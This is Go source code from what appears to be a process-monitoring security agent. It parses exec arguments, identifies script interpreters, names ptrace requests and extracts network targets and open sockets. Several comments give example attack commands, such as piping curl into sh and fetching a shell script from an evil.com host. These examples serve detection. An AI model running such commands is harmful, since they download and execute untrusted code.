// nullStr converts a null-terminated C byte slice to a Go string.
func nullStr(b []byte) string {
	for i, c := range b {
		if c == 0 {
			return string(b[:i])
		}
	}
	return string(b)
}

// parseArgs converts NUL-separated args buffer into a []string.
func parseArgs(buf []byte, length uint32) []string {
	if length == 0 {
		return nil
	}
	if int(length) > len(buf) {
		length = uint32(len(buf))
	}
	raw := buf[:length]
	parts := bytes.Split(bytes.TrimRight(raw, "\x00"), []byte{0})
	result := make([]string, 0, len(parts))
	for _, p := range parts {
		// Filter non-printable junk.
		s := strings.Map(func(r rune) rune {
			if unicode.IsPrint(r) {
				return r
			}
			return -1
		}, string(p))
		if s != "" {
			result = append(result, s)
		}
	}
	return result
}

// bootTimeToWallClock converts a kernel ktime_get_ns() timestamp to wall clock time.
// ktime_get_ns() is monotonic from boot; we add it to the system boot time.
func bootTimeToWallClock(ns uint64) time.Time {
	return utils.BootNsToTime(ns)
}

// detectInterpreter returns the interpreter name and script path for
// processes like "python3 /tmp/exploit.py" or "bash -c 'curl | sh'".
func detectInterpreter(proc types.ProcessContext) (string, string) {
	name := filepath.Base(proc.ExePath)
	interpreters := map[string]bool{
		"python": true, "python2": true, "python3": true,
		"perl": true, "ruby": true, "php": true, "lua": true,
		"bash": true, "sh": true, "zsh": true, "ksh": true, "dash": true,
		"node": true, "nodejs": true, "deno": true,
	}
	if !interpreters[name] {
		return "", ""
	}
	// Find first non-flag argument as the script path.
	if len(proc.Args) < 2 {
		return name, ""
	}
	for _, arg := range proc.Args[1:] {
		if !strings.HasPrefix(arg, "-") {
			return name, arg
		}
	}
	return name, ""
}

func ptraceRequestName(req uint32) string {
	names := map[uint32]string{
		4: "PTRACE_POKETEXT", 5: "PTRACE_POKEDATA",
		13: "PTRACE_SETREGS", 15: "PTRACE_SETFPREGS",
		16: "PTRACE_ATTACH", 17: "PTRACE_DETACH",
		0x4206: "PTRACE_SEIZE",
	}
	if name, ok := names[req]; ok {
		return name
	}
	return fmt.Sprintf("PTRACE_0x%x", req)
}

// ─── Exec-time network enrichment ────────────────────────────────────────────

// enrichOpenSockets returns a snapshot of all sockets the process has open
// at the moment the exec event fires.  Timing is inherently racy (the process
// may not have connected yet) but catches inherited or fast-connecting tools.
func enrichOpenSockets(pid uint32) []types.SocketInfo {
	entries := utils.PidOpenSockets(pid)
	if len(entries) == 0 {
		return nil
	}
	out := make([]types.SocketInfo, 0, len(entries))
	for _, e := range entries {
		// Skip pure LISTEN sockets (remote = 0.0.0.0:0)
		if e.DstIP == "0.0.0.0" || e.DstPort == 0 {
			continue
		}
		out = append(out, types.SocketInfo{
			SrcIP:    e.SrcIP,
			SrcPort:  e.SrcPort,
			DstIP:    e.DstIP,
			DstPort:  e.DstPort,
			Protocol: e.Proto,
			State:    e.State,
		})
	}
	return out
}

// enrichNetworkTargets extracts URL / hostname / IP targets from the process
// command line (e.g. "curl https://evil.com/shell.sh" → host=evil.com).
func enrichNetworkTargets(proc types.ProcessContext) []types.NetworkTarget {
	raw := utils.ParseNetworkTargets(proc.Comm, proc.Args)
	if len(raw) == 0 {
		return nil
	}
	out := make([]types.NetworkTarget, 0, len(raw))
	for _, r := range raw {
		out = append(out, types.NetworkTarget{
			Raw:    r.Raw,
			Host:   r.Host,
			Port:   r.Port,
			Scheme: r.Scheme,
		})
	}
	return out
}
